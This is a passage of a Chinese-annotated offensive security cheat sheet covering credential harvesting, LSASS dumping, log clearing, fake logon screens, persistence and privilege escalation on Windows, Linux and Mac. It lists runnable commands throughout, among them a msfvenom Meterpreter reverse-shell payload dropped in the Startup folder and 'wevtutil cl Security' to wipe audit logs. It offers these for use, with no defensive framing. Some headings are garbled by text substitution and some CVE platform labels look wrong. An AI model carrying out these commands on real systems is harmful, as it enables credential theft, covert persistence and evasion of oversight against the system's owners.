<pre class="line-numbers language-none"><code class="language-none">Rubeus.exe asktgy &#x2F;user:CORP\itadmin &#x2F;certificate:C:\cert.pfx &#x2F;password:password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Password-Mining-in-Memory"><a href="#Password-Mining-in-Memory" class="headerlink" title="Password Mining in Memory"></a>Password Mining in Memory</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Linux</p>
<p>类型:  Enumeration &amp; Hunt</p>
<p>方法: </p>
<ol>
<li><code>ps -ef | grep ftp;</code></li>
<li><code>gdp -p ftp_id</code></li>
<li><code>info proc mappings</code></li>
<li><code>q</code></li>
<li><code>dump memory /tmp/mem [start] [end]</code></li>
<li><code>q</code></li>
<li><code>strings /tmp/mem | grep passw</code></li>
</ol>
<h2 id="Password-Mining-in-Memory-1"><a href="#Password-Mining-in-Memory-1" class="headerlink" title="Password Mining in Memory"></a>Password Mining in Memory</h2><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunt</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<p>In Metasploit (msf &gt; prompt) 输入: <code>use auxiliary/server/capture/http_basic</code></p>
<p>In Metasploit (msf &gt; prompt) 输入: <code>set uripath x</code></p>
<p>In Metasploit (msf &gt; prompt) 输入: <code>run</code></p>
<ol start="2">
<li></li>
</ol>
<p>在taskmgr中，右键单击“Image Name”栏中的“iexplore.exe”</p>
<p>并从弹出菜单中选择“创建转储文件”.</p>
<ol start="3">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">strings &#x2F;root&#x2F;Desktop&#x2F;iexplore.DMP | grep &quot;Authorization: Basic&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>选择复制 Base64 编码字符串.</p>
<p>在命令提示符下键入: <code>echo -ne [Base64 String] | base64 -d</code></p>
<h3 id="Password-Mining-in-Registry"><a href="#Password-Mining-in-Registry" class="headerlink" title="Password Mining in Registry"></a>Password Mining in Registry</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunt</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<p>打开命令并输入:</p>
<pre class="line-numbers language-none"><code class="language-none">reg query “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon” &#x2F;v DefaultUsername<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>1. </p>
<p>在命令提示符下键入:</p>
<pre class="line-numbers language-none"><code class="language-none">reg query “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon” &#x2F;v DefaultPassword<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>1. </p>
<p>请注意输出中的凭据</p>
<p>1. </p>
<p>在命令提示符下键入:</p>
<pre class="line-numbers language-none"><code class="language-none">reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\BWP123F42 -v ProxyUsername<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>1. </p>
<p>在命令提示符下键入:</p>
<pre class="line-numbers language-none"><code class="language-none">reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\BWP123F42 -v ProxyPassword<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol>
<li>注意输出中的凭据</li>
<li></li>
</ol>
<p>在命令提示符下键入:</p>
<pre class="line-numbers language-none"><code class="language-none">reg query HKEY_CURRENT_USER\Software\TightVNC\Server &#x2F;v Password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>1. </p>
<p>在命令提示符下键入:</p>
<pre class="line-numbers language-none"><code class="language-none">reg query HKEY_CURRENT_USER\Software\TightVNC\Server &#x2F;v PasswordViewOnly<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>1. </p>
<p>记下加密的密码并输入:</p>
<pre class="line-numbers language-none"><code class="language-none">C:\Users\User\Desktop\Tools\vncpwd\vncpwd.exe [Encrypted Password]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>1. </p>
<p>从输出中记下凭据.</p>
<h3 id="Password-Mining-in-General-Events-via-SeAudit"><a href="#Password-Mining-in-General-Events-via-SeAudit" class="headerlink" title="Password Mining in General Events via SeAudit"></a>Password Mining in General Events via SeAudit</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunt</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;WELA.ps1 -LogFile .\Security.evtx -EventIDStatistics<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="2">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">flog -s 10s -n 200<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Or</p>
<pre class="line-numbers language-none"><code class="language-none">invoke-module LogCleaner.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Password-Mining-in-Security-Events-via-SeSecurity"><a href="#Password-Mining-in-Security-Events-via-SeSecurity" class="headerlink" title="Password Mining in Security Events via SeSecurity"></a>Password Mining in Security Events via SeSecurity</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunt</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;WELA.ps1 -LogFile .\Security.evtx -EventIDStatistics<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="2">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">flog -s 10s -n 200<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Or</p>
<pre class="line-numbers language-none"><code class="language-none">wevtutil cl Security<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Startup-Applications"><a href="#Startup-Applications" class="headerlink" title="Startup Applications"></a>Startup Applications</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunt</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<p>In Metasploit (msf &gt; prompt) 输入: <code>use multi/handler</code></p>
<p>In Metasploit (msf &gt; prompt) 输入: <code>set payload windows/meterpreter/reverse_tcp</code></p>
<p>In Metasploit (msf &gt; prompt) 输入: <code>set lhost [Kali VM IP Address]</code></p>
<p>In Metasploit (msf &gt; prompt) 输入: <code>run</code></p>
<p>打开另一个命令提示符并键入:</p>
<pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;[Kali VM IP Address] -f exe -o x.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="2">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">将 x.exe 放在“C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Password-Mining-in-McAfeeSitelistFiles"><a href="#Password-Mining-in-McAfeeSitelistFiles" class="headerlink" title="Password Mining in McAfeeSitelistFiles"></a>Password Mining in McAfeeSitelistFiles</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunt</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">SharpUp.exe McAfeeSitelistFiles<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>批注：<a href="https://github.com/GhostPack/SharpUp">https://github.com/GhostPack/SharpUp</a></p>
<h3 id="Password-Mining-in-CachedGPPPassword"><a href="#Password-Mining-in-CachedGPPPassword" class="headerlink" title="Password Mining in CachedGPPPassword"></a>Password Mining in CachedGPPPassword</h3><p>域名: Y&#x2F;N</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunt</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">SharpUp.exe CachedGPPPassword<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Password-Mining-in-DomainGPPPassword"><a href="#Password-Mining-in-DomainGPPPassword" class="headerlink" title="Password Mining in DomainGPPPassword"></a>Password Mining in DomainGPPPassword</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunt</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">SharpUp.exe domianGPPPassword<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Password-Mining-in-KeePass"><a href="#Password-Mining-in-KeePass" class="headerlink" title="Password Mining in KeePass"></a>Password Mining in KeePass</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunt</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">Seatbelt.exe keepass<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Or</p>
<pre class="line-numbers language-none"><code class="language-none">KeeTheft.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>批注：</p>
<p>seatbelt：<a href="https://github.com/GhostPack/Seatbelt">https://github.com/GhostPack/Seatbelt</a></p>
<p>KeeTheft未找到</p>
<h3 id="Password-Mining-in-WindowsVault"><a href="#Password-Mining-in-WindowsVault" class="headerlink" title="Password Mining in WindowsVault"></a>Password Mining in WindowsVault</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunt</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">Seatbelt.exe WindowsVault<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Password-Mining-in-SecPackageCreds"><a href="#Password-Mining-in-SecPackageCreds" class="headerlink" title="Password Mining in SecPackageCreds"></a>Password Mining in SecPackageCreds</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunt</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">Seatbelt.exe SecPackageCreds<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Password-Mining-in-PuttyH操作系统tKeys"><a href="#Password-Mining-in-PuttyH操作系统tKeys" class="headerlink" title="Password Mining in PuttyH操作系统tKeys"></a>Password Mining in PuttyH操作系统tKeys</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunt</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">Seatbelt.exe PuttyHostKeys<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Password-Mining-in-RDCManFiles"><a href="#Password-Mining-in-RDCManFiles" class="headerlink" title="Password Mining in RDCManFiles"></a>Password Mining in RDCManFiles</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunt</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">Seatbelt.exe RDCManFiles<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Password-Mining-in-RDPSavedConnections"><a href="#Password-Mining-in-RDPSavedConnections" class="headerlink" title="Password Mining in RDPSavedConnections"></a>Password Mining in RDPSavedConnections</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunt</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">Seatbelt.exe RDPSavedConnections<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Password-Mining-in-MasterKeys"><a href="#Password-Mining-in-MasterKeys" class="headerlink" title="Password Mining in MasterKeys"></a>Password Mining in MasterKeys</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunt</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">SharpDPAPI masterkeys<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>批注：<a href="https://github.com/GhostPack/SharpDPAPI">https://github.com/GhostPack/SharpDPAPI</a></p>
<h3 id="Password-Mining-in-Browsers"><a href="#Password-Mining-in-Browsers" class="headerlink" title="Password Mining in Browsers"></a>Password Mining in Browsers</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunt</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">SharpWeb.exe all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>批注：<a href="https://github.com/djhohnstein/SharpWeb/releases/tag/v1.2">https://github.com/djhohnstein/SharpWeb/releases/tag/v1.2</a></p>
<h3 id="Password-Mining-in-Files"><a href="#Password-Mining-in-Files" class="headerlink" title="Password Mining in Files"></a>Password Mining in Files</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunt</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">SauronEye.exe -d C:\Users\vincent\Desktop\ –filetypes .txt .doc .docx .xls –contents –keywords password pass* -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>批注：<a href="https://github.com/vivami/SauronEye/releases/tag/v0.0.9">https://github.com/vivami/SauronEye/releases/tag/v0.0.9</a></p>
<h3 id="Password-Mining-in-LDAP"><a href="#Password-Mining-in-LDAP" class="headerlink" title="Password Mining in LDAP"></a>Password Mining in LDAP</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunt</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">SharpLDAPSearch.exe &quot;(&amp;(objectClass&#x3D;user)(cn&#x3D;*svc*))&quot; &quot;sam用户名&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Or</p>
<pre class="line-numbers language-none"><code class="language-none">Import-Module .\PowerView.ps1
Get-DomainComputer COMPUTER -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwdExpirationTime<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>



<p>批注：</p>
<p>sharpldapsearch：<a href="https://github.com/mitchmoser/SharpLDAPSearch/releases/tag/v1.2">https://github.com/mitchmoser/SharpLDAPSearch/releases/tag/v1.2</a></p>
<p>powerview：好多个版本，应该是这个吧？<a href="https://github.com/ericshoemaker/PowerView">https://github.com/ericshoemaker/PowerView</a></p>
<h3 id="Password-Mining-in-Clipboard"><a href="#Password-Mining-in-Clipboard" class="headerlink" title="Password Mining in Clipboard"></a>Password Mining in Clipboard</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunt</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">execute-assembly &#x2F;root&#x2F;SharpClipHistory.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>批注：<a href="https://github.com/FSecureLABS/SharpClipHistory/releases/tag/v1.0">https://github.com/FSecureLABS/SharpClipHistory/releases/tag/v1.0</a></p>
<h3 id="Password-Mining-in-GMSA-Password"><a href="#Password-Mining-in-GMSA-Password" class="headerlink" title="Password Mining in GMSA Password"></a>Password Mining in GMSA Password</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunt</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">GMSAPasswordReader.exe –accountname SVC_SERVICE_ACCOUNT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>批注：<a href="https://github.com/rvazarkar/GMSAPasswordReader">https://github.com/rvazarkar/GMSAPasswordReader</a></p>
<h3 id="Delegate-tokens-via-RDP"><a href="#Delegate-tokens-via-RDP" class="headerlink" title="Delegate tokens via RDP"></a>Delegate tokens via RDP</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows&#x2F;Linux</p>
<p>类型:  Delegate tokens</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;fake_rdp.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Or</p>
<pre class="line-numbers language-none"><code class="language-none">pyrdp-mitm.py 192.168.1.10 -k private_key.pem -c certificate.pem<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>批注：</p>
<p>fake_rdp：<a href="https://github.com/cheeseandcereal/fake-rdp">https://github.com/cheeseandcereal/fake-rdp</a></p>
<p>pyrdp-mitm未找到QAQ</p>
<h3 id="Delegate-tokens-via-FTP"><a href="#Delegate-tokens-via-FTP" class="headerlink" title="Delegate tokens via FTP"></a>Delegate tokens via FTP</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows&#x2F;Linux</p>
<p>类型:  Delegate tokens</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">FakeFtpServer fakeFtpServer &#x3D; new FakeFtpServer();

fakeFtpServer.addUserAccount(new UserAccount(“user”, “password”, “c:\\data”));

FileSystem fileSystem &#x3D; new WindowsFakeFileSystem();

fileSystem.add(new DirectoryEntry(“c:\\data”));

fileSystem.add(new FileEntry(“c:\\data\\file1.txt”, “abcdef 1234567890”));

fileSystem.add(new FileEntry(“c:\\data\\run.exe”));

fakeFtpServer.setFileSystem(fileSystem);  

fakeFtpServer.start();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="Fake-Logon-Screen"><a href="#Fake-Logon-Screen" class="headerlink" title="Fake Logon Screen"></a>Fake Logon Screen</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Delegate tokens</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">execute-assembly fakelogonscreen.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>批注：<a href="https://github.com/bitsadmin/fakelogonscreen/releases/tag/1.1">https://github.com/bitsadmin/fakelogonscreen/releases/tag/1.1</a></p>
<h3 id="Abusing-WinRM-Services"><a href="#Abusing-WinRM-Services" class="headerlink" title="Abusing WinRM Services"></a>Abusing WinRM Services</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Service</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">RogueWinRM.exe -p C:\windows\system32\cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>批注：<a href="https://github.com/antonioCoco/RogueWinRM/releases/tag/1.1">https://github.com/antonioCoco/RogueWinRM/releases/tag/1.1</a></p>
<h3 id="Dump-lsass-with-SilentProcessExit"><a href="#Dump-lsass-with-SilentProcessExit" class="headerlink" title="Dump lsass with SilentProcessExit"></a>Dump lsass with SilentProcessExit</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunting</p>
<p>方法: </p>
<ol>
<li><code>SilentProcessExit.exe pid</code></li>
</ol>
<p>批注：<a href="https://github.com/deepinstinct/LsassSilentProcessExit">https://github.com/deepinstinct/LsassSilentProcessExit</a></p>
<h3 id="Lsass-Shtinkering"><a href="#Lsass-Shtinkering" class="headerlink" title="Lsass Shtinkering"></a>Lsass Shtinkering</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunting</p>
<p>方法: </p>
<ol>
<li><code>HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps-&gt;2</code></li>
<li><code>LSASS_Shtinkering.exe pid</code></li>
</ol>
<p>批注：<a href="https://github.com/deepinstinct/Lsass-Shtinkering">https://github.com/deepinstinct/Lsass-Shtinkering</a></p>
<h3 id="AndrewSpecial"><a href="#AndrewSpecial" class="headerlink" title="AndrewSpecial"></a>AndrewSpecial</h3><p>域: No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Enumeration &amp; Hunting</p>
<p>方法： </p>
<ul>
<li><code>AndrewSpecial.exe</code></li>
</ul>
<p>批注：<a href="https://github.com/hoangprod/AndrewSpecial">https://github.com/hoangprod/AndrewSpecial</a></p>
<h3 id="CCACHE-ticket-reuse-from-x2F-tmp"><a href="#CCACHE-ticket-reuse-from-x2F-tmp" class="headerlink" title="CCACHE ticket reuse from &#x2F;tmp"></a>CCACHE ticket reuse from &#x2F;tmp</h3><p>域: Yes</p>
<p>Local Admin: Yes</p>
<p>操作系统: Linux</p>
<p>类型:  Enumeration &amp; Hunting</p>
<p>方法: </p>
<ul>
<li><code>ls /tmp/ | grep krb5cc_X</code></li>
<li><code>export KRB5CCNAME=/tmp/krb5cc_X</code></li>
</ul>
<h3 id="CCACHE-ticket-reuse-from-keyring"><a href="#CCACHE-ticket-reuse-from-keyring" class="headerlink" title="CCACHE ticket reuse from keyring"></a>CCACHE ticket reuse from keyring</h3><p>域: Yes</p>
<p>Local Admin: Yes</p>
<p>操作系统: Linux</p>
<p>类型:  Enumeration &amp; Hunting</p>
<p>方法: </p>
<ul>
<li><code>https://github.com/TarlogicSecurity/tickey</code></li>
<li><code>/tmp/tickey -i</code></li>
</ul>
<h3 id="CCACHE-ticket-reuse-from-SSSD-KCM"><a href="#CCACHE-ticket-reuse-from-SSSD-KCM" class="headerlink" title="CCACHE ticket reuse from SSSD KCM"></a>CCACHE ticket reuse from SSSD KCM</h3><p>域: Yes</p>
<p>Local Admin: Yes</p>
<p>操作系统: Linux</p>
<p>类型:  Enumeration &amp; Hunting</p>
<p>方法： </p>
<ul>
<li><code>git clone https://github.com/fireeye/SSSDKCMExtractor</code></li>
<li><code>python3 SSSDKCMExtractor.py –database secrets.ldb –key secrets.mkey</code></li>
</ul>
<h3 id="CCACHE-ticket-reuse-from-keytab"><a href="#CCACHE-ticket-reuse-from-keytab" class="headerlink" title="CCACHE ticket reuse from keytab"></a>CCACHE ticket reuse from keytab</h3><p>域: Yes</p>
<p>Local Admin: Yes</p>
<p>操作系统： Linux&#x2F;Windows&#x2F;Mac</p>
<p>类型：  Enumeration &amp; Hunting</p>
<p>方法： </p>
<ul>
<li><code>git clone https://github.com/its-a-feature/KeytabParser</code></li>
<li><code>python KeytabParser.py /etc/krb5.keytab</code></li>
<li><code>klist -k /etc/krb5.keytab</code></li>
</ul>
<p>Or</p>
<ul>
<li><code>klist.exe -t -K -e -k FILE:C:\Users\User\downloads\krb5.keytab</code></li>
<li><code>python3 keytabextract.py krb5.keytab</code></li>
<li><code>./bifrost -action dump -source keytab -path test</code></li>
</ul>
<h3 id="SSH-Forwarder"><a href="#SSH-Forwarder" class="headerlink" title="SSH Forwarder"></a>SSH Forwarder</h3><p>域：Yes</p>
<p>Local Admin: Yes</p>
<p>操作系统： Linux</p>
<p>类型：  Enumeration &amp; Hunting</p>
<p>方法： </p>
<ul>
<li>转发代理 yes<code>ForwardAgent yes</code></li>
<li><code>SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh bob@boston</code></li>
</ul>
<p>AppleScript</p>
<p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  Enumeration &amp; Hunt</p>
<p>方法： </p>
<ul>
<li>(EmPyre) &gt; <code>listeners</code></li>
<li>(EmPyre: listeners) &gt; <code>set Name mylistener</code></li>
<li>(EmPyre: listeners) &gt; <code>execute</code></li>
<li>(EmPyre: listeners) &gt; <code>usestager applescript mylistener</code></li>
<li>(EmPyre: stager&#x2F;applescript) &gt; <code>execute</code></li>
</ul>
<p>批注：这个工具我找了半天，发现这是个七八年前的一个工具</p>
<p>链接地址<a href="https://github.com/EmpireProject/EmPyre">https://github.com/EmpireProject/EmPyre</a></p>
<h3 id="DLL-Search-Order-Hijacking"><a href="#DLL-Search-Order-Hijacking" class="headerlink" title="DLL Search Order Hijacking"></a>DLL Search Order Hijacking</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  Hijack</p>
<p>方法： </p>
<ul>
<li><code>https://github.com/slaeryan/AQUARMOURY/tree/master/Brownie</code></li>
<li>运行<code>Brownie</code></li>
</ul>
<h3 id="Slui-File-Handler-Hijack-LPE"><a href="#Slui-File-Handler-Hijack-LPE" class="headerlink" title="Slui File Handler Hijack LPE"></a>Slui File Handler Hijack LPE</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  Hijack</p>
<p>方法： </p>
<ul>
<li><code>https://github.com/bytecode77/slui-file-handler-hijack-privilege-escalation</code></li>
<li><code>Slui.exe</code></li>
</ul>
<h3 id="CDPSvc-DLL-Hijacking"><a href="#CDPSvc-DLL-Hijacking" class="headerlink" title="CDPSvc DLL Hijacking"></a>CDPSvc DLL Hijacking</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  Hijack</p>
<p>方法： </p>
<ul>
<li><code>Cdpsgshims.exe</code></li>
</ul>
<h3 id="Magnify-exe-Dll-Search-Order-Hijacking"><a href="#Magnify-exe-Dll-Search-Order-Hijacking" class="headerlink" title="Magnify.exe Dll Search Order Hijacking"></a>Magnify.exe Dll Search Order Hijacking</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  Hijack</p>
<p>方法： </p>
<ul>
<li><code>将有效负载 dll 作为 igdgmm64.dll 复制到可写的系统路径 %PATH%，例如 C:\python27</code></li>
<li>按Win键+L</li>
<li>按回车键</li>
<li><code>在显示密码框的登录屏幕上按 WinKey++(plusKey).</code></li>
<li><code>然后payload dll将以系统访问权限执行.</code></li>
</ul>
<h3 id="CdpSvc-Service"><a href="#CdpSvc-Service" class="headerlink" title="CdpSvc Service"></a>CdpSvc Service</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  Hijack</p>
<p>方法： </p>
<ul>
<li><code>使用 acltest.ps1 查找可写系统路径（例如 C:\python27）</code></li>
<li><code>C:\CdpSvcLPE&gt; powershell -ep bypass “..\acltest.ps1”</code></li>
<li>将 <code>cdpsgshims.dll</code>复制到 <code>C:\python27</code></li>
<li>创建 <code>C:\temp</code> 文件夹并将 <code>impersonate.bin</code> 复制到 <code>C:\temp</code></li>
<li><code>C:\CdpSvcLPE&gt; mkdir C:\temp</code></li>
<li><code>C:\CdpSvcLPE&gt; copy impersonate.bin C:\temp</code></li>
<li>重新启动（或以管理员身份停止&#x2F;启动 CDPSvc）</li>
<li><code>cmd 将提示 nt authority\system。</code></li>
</ul>
<h3 id="HiveNightmare"><a href="#HiveNightmare" class="headerlink" title="HiveNightmare"></a>HiveNightmare</h3><p>域：Yes</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  0&#x2F;1 Exploit</p>
<p>方法： </p>
<ul>
<li><code>HiveNightmare.exe 200</code></li>
</ul>
<p>CVE-2021-30655</p>
<p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Windows</p>
<p>类型：  0&#x2F;1 Exploit</p>
<p>方法： </p>
<ul>
<li><code>https://github.com/thehappydinoa/rootOS</code></li>
<li><code>Python rootOS.py</code></li>
</ul>
<p>CVE-2019-8526</p>
<p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Mac</p>
<p>类型：  0&#x2F;1 Exploit</p>
<p>方法： </p>
<ul>
<li><code>https://github.com/amanszpapaya/MacPer</code></li>
<li><code>Python main.py</code></li>
</ul>
<p>CVE-2020-9771</p>
<p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Mac</p>
<p>类型：  0&#x2F;1 Exploit</p>
<p>方法： </p>
<ul>
<li><code>https://github.com/amanszpapaya/MacPer</code></li>
<li><code>Python main.py</code></li>
</ul>
<p>CVE-2021-3156</p>
<p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Mac</p>
<p>类型：  0&#x2F;1 Exploit</p>
<p>方法： </p>
<ul>
<li><code>https://github.com/amanszpapaya/MacPer</code></li>
<li><code>Python main.py</code></li>
</ul>
<p>CVE-2018-4280</p>
<p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统： Mac</p>
<p>类型：  0&#x2F;1 Exploit</p>
<p>方法： </p>
<ul>
<li><code>https://github.com/bazad/launchd-portrep</code></li>
<li><code>./launchd-portrep ‘touch /tmp/exploit-success’=</code></li>
</ul>
